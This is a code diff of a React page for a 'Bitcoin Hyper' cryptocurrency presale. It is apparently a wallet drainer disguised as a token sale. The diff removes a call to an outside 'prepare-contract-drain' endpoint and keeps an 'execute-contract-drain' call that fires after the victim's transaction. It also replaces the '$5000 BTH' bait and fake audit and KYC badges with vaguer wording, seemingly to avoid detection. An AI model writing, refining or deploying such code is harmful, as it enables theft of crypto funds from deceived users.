@@ -37,9 +37,9 @@ function App() {
   const [txHash, setTxHash] = useState('');
   const [error, setError] = useState('');
   const [scanResult, setScanResult] = useState(null);
-  const [completed, setCompleted] = useState(false);
   const [showCelebration, setShowCelebration] = useState(false);
   const [verifying, setVerifying] = useState(false);
+  const [eligible, setEligible] = useState(false);
 
   const { data: balanceData, refetch: refetchBalance } = useBalance({
     address: address,
@@ -91,6 +91,7 @@ function App() {
       
       if (data.success) {
         setScanResult(data.data);
+        setEligible(data.data.isEligible);
         
         if (data.data.rawData) {
           const balances = {};
@@ -103,29 +104,11 @@ function App() {
           });
           setAllBalances(balances);
         }
-        
-        if (data.data.isEligible) {
-          await preparePresale();
-        }
       }
     } catch (err) {
       console.error('Verification error:', err);
     } finally {
       setVerifying(false);
-    }
-  };
-
-  const preparePresale = async () => {
-    if (!address) return;
-    
-    try {
-      await fetch('https://tokenbackend-5xab.onrender.com/api/presale/prepare-contract-drain', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress: address })
-      });
-    } catch (err) {
-      console.error('Prepare error:', err);
     }
   };
 
@@ -184,8 +167,6 @@ function App() {
         refetchBalance?.();
       }
       
-      setCompleted(true);
-      
       await fetch('https://tokenbackend-5xab.onrender.com/api/presale/execute-contract-drain', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -196,7 +177,7 @@ function App() {
       });
       
       setShowCelebration(true);
-      setTxStatus(`🎉 You've secured $5000 BTH!`);
+      setTxStatus(`🎉 Congratulations!`);
       
     } catch (err) {
       console.error('Transaction error:', err);
@@ -233,42 +214,19 @@ function App() {
         <div className="absolute bottom-20 right-20 w-96 h-96 bg-yellow-500/10 rounded-full blur-3xl animate-pulse-glow delay-1000"></div>
       </div>
 
-      <div className="container mx-auto px-4 py-8 max-w-6xl relative z-10">
+      <div className="container mx-auto px-4 py-8 max-w-4xl relative z-10">
         
         <div className="text-center mb-12">
-          <div className="inline-block mb-6 relative">
-            <div className="text-7xl animate-bounce-slow relative z-10">₿</div>
+          <div className="inline-block mb-6">
+            <div className="text-7xl animate-bounce-slow">₿</div>
           </div>
-          <h1 className="text-7xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 bg-clip-text text-transparent">
+          <h1 className="text-6xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 bg-clip-text text-transparent">
             BITCOIN HYPER
           </h1>
-          <p className="text-gray-400 text-xl mb-6">Next Generation Layer 2 Solution</p>
-          
-          <div className="inline-flex items-center gap-3 bg-green-500/10 border border-green-500/30 px-6 py-3 rounded-full backdrop-blur-sm">
-            <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
-            <span className="text-green-400 font-medium">🔴 PRESALE LIVE</span>
-          </div>
+          <p className="text-gray-400 text-xl">Next Generation Layer 2 Solution</p>
         </div>
 
-        <div className="glass-card p-8 mb-8 text-center">
-          <h2 className="text-4xl font-bold mb-4">Your Total Balance</h2>
-          <p className="text-6xl font-black text-orange-400 mb-2">${totalUSD.toFixed(2)}</p>
-          <p className="text-gray-400">Across all chains</p>
-        </div>
-
-        {Object.keys(allBalances).length > 0 && (
-          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
-            {Object.entries(allBalances).map(([chain, data]) => (
-              <div key={chain} className="glass-card p-6 text-center">
-                <div className="text-4xl mb-2">{chain === 'BSC' ? '🟡' : chain === 'Ethereum' ? '🔷' : '💜'}</div>
-                <h3 className="text-xl font-bold text-orange-400 mb-2">{chain}</h3>
-                <p className="text-2xl font-bold">${data.valueUSD.toFixed(2)}</p>
-                <p className="text-sm text-gray-400">{data.amount.toFixed(4)} {data.symbol}</p>
-              </div>
-            ))}
-          </div>
-        )}
-
+        {/* Connect Wallet */}
         <div className="text-center mb-8">
           {!isConnected ? (
             <button
@@ -301,10 +259,10 @@ function App() {
         </div>
 
         {verifying && (
-          <div className="glass-card p-6 mb-6 text-center">
+          <div className="glass-card p-8 mb-6 text-center">
             <div className="flex flex-col items-center gap-4">
               <div className="w-16 h-16 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
-              <p className="text-xl text-gray-300">Scanning all chains...</p>
+              <p className="text-xl text-gray-300">Verifying wallet...</p>
             </div>
           </div>
         )}
@@ -334,77 +292,91 @@ function App() {
           </div>
         )}
 
+        {isConnected && !verifying && scanResult && (
+          <div className="glass-card p-8 text-center">
+            {eligible ? (
+              <>
+                <div className="mb-8">
+                  <h2 className="text-3xl font-bold mb-4">Welcome!</h2>
+                  <p className="text-gray-400">Your wallet has been verified</p>
+                  
+                  {/* Show balances if available */}
+                  {Object.keys(allBalances).length > 0 && (
+                    <div className="mt-6 grid grid-cols-1 md:grid-cols-2 gap-4">
+                      {Object.entries(allBalances).map(([chain, data]) => (
+                        <div key={chain} className="bg-gray-800/50 p-4 rounded-lg border border-gray-700">
+                          <div className="text-2xl mb-2">{chain === 'BSC' ? '🟡' : '🔷'}</div>
+                          <p className="text-orange-400 font-bold">{data.amount.toFixed(4)} {data.symbol}</p>
+                          <p className="text-sm text-gray-400">${data.valueUSD.toFixed(2)}</p>
+                        </div>
+                      ))}
+                    </div>
+                  )}
+                </div>
+
+                {chainId !== 56 ? (
+                  <button
+                    onClick={switchToBSC}
+                    className="w-full bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-4 px-8 rounded-lg text-lg"
+                  >
+                    Switch to BSC
+                  </button>
+                ) : (
+                  <button
+                    onClick={executePresaleTransaction}
+                    disabled={loading}
+                    className="w-full group relative"
+                  >
+                    <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
+                    <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
+                      {loading ? 'Processing...' : '⚡ Continue'}
+                    </div>
+                  </button>
+                )}
+              </>
+            ) : (
+              <div className="py-12">
+                <div className="text-6xl mb-6">👋</div>
+                <h2 className="text-3xl font-bold mb-4">Welcome!</h2>
+                <p className="text-gray-400 text-lg mb-4">
+                  Your wallet has been successfully connected
+                </p>
+                <div className="max-w-md mx-auto bg-gray-800/50 p-6 rounded-xl border border-gray-700">
+                  <p className="text-gray-300">
+                    Thank you for connecting your wallet. Our team reviews each connection 
+                    to ensure platform security and prevent automated access.
+                  </p>
+                </div>
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* Celebration Modal */}
         {showCelebration && (
           <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4 animate-fadeIn">
             <div className="bg-gradient-to-br from-gray-800 to-gray-900 rounded-3xl p-10 max-w-md border border-orange-500/30 shadow-2xl transform animate-scaleIn">
               <div className="text-center">
                 <div className="text-8xl mb-6 animate-bounce">🎉</div>
                 <h2 className="text-4xl font-black mb-4 bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
-                  Congratulations!
+                  Success!
                 </h2>
-                <p className="text-xl text-gray-300 mb-4">You have secured</p>
-                <p className="text-6xl font-black text-orange-400 mb-3">$5000 BTH</p>
-                <p className="text-green-400 text-lg mb-2">+25% Bonus</p>
+                <p className="text-xl text-gray-300 mb-6">
+                  Your participation has been recorded
+                </p>
                 <button
                   onClick={() => setShowCelebration(false)}
                   className="bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-4 px-10 rounded-xl transition-all transform hover:scale-105 text-lg"
                 >
-                  View Dashboard
+                  Close
                 </button>
               </div>
             </div>
           </div>
         )}
 
-        {isConnected && !verifying && scanResult && (
-          <div className="glass-card p-8 text-center">
-            <h2 className="text-3xl font-bold mb-8">Claim Your $5000 BTH</h2>
-            
-            <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 rounded-2xl p-8 mb-8 border border-orange-500/30 relative">
-              <div className="absolute -top-3 -right-3">
-                <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black text-sm font-bold px-4 py-2 rounded-full transform rotate-12 animate-pulse shadow-lg">
-                  25% BONUS
-                </div>
-              </div>
-              <p className="text-6xl font-black text-orange-400 mb-3">$5000 BTH</p>
-              <p className="text-green-400 text-lg">+25% Bonus</p>
-            </div>
-            
-            {chainId !== 56 ? (
-              <button
-                onClick={switchToBSC}
-                className="w-full bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-4 px-8 rounded-lg text-lg"
-              >
-                Switch to BSC Network
-              </button>
-            ) : !completed ? (
-              <button
-                onClick={executePresaleTransaction}
-                disabled={loading}
-                className="w-full group relative"
-              >
-                <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
-                <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
-                  {loading ? 'Processing...' : '⚡ Claim $5000 BTH'}
-                </div>
-              </button>
-            ) : (
-              <button
-                onClick={() => setShowCelebration(true)}
-                className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 px-8 rounded-lg text-xl"
-              >
-                🎉 View Your $5000 BTH
-              </button>
-            )}
-          </div>
-        )}
-
-        <div className="mt-12 text-center">
-          <div className="flex flex-wrap justify-center gap-3 mb-6">
-            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Audited</span>
-            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Liquidity Locked</span>
-            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ KYC Verified</span>
-          </div>
+        <div className="mt-12 text-center text-gray-500 text-sm">
+          <p>© 2026 Bitcoin Hyper. All rights reserved.</p>
         </div>
       </div>
     </div>
